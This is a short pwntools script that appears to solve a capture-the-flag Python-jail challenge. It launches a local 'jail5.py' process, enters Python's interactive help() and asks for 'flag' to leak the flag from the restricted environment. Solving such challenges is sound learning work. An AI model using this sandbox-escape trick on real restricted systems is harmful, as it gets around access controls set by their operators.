from pwn import *

c = process('./jail5.py')
c.send(b'help()\n')
c.recvuntil(b'help> ')
c.send(b'flag\n')
print(c.recvuntil(b'help> '))
